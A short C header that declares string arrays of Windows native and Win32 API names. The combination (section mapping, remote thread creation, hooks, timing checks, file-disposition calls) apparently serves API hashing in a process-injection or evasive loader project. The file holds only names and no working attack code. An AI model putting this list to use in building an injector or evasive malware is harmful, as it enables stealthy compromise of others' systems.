#pragma once
#include <Windows.h>

PCHAR NativeApis[] = {
	"NtCreateSection",
	"NtMapViewOfSection",
	"NtUnmapViewOfSection",
	"NtClose",
	"NtCreateThreadEx",
	"NtWaitForSingleObject",
	"NtQuerySystemInformation",
	"NtDelayExecution"
};
DWORD NativeApisCount = 8;

PCHAR WindowsApis[] = {
	"FindResourceW",
	"LoadResource",
	"LockResource",
	"SizeofResource",
	"GetTickCount64",
	"OpenProcess",
	"CallNextHookEx",
	"SetWindowsHookExW",
	"GetMessageW",
	"DefWindowProcW",
	"UnhookWindowsHookEx",
	"GetModuleFileNameW",
	"CreateFileW",
	"SetFileInformationByHandle",
};
DWORD WindowsApisCount = 14;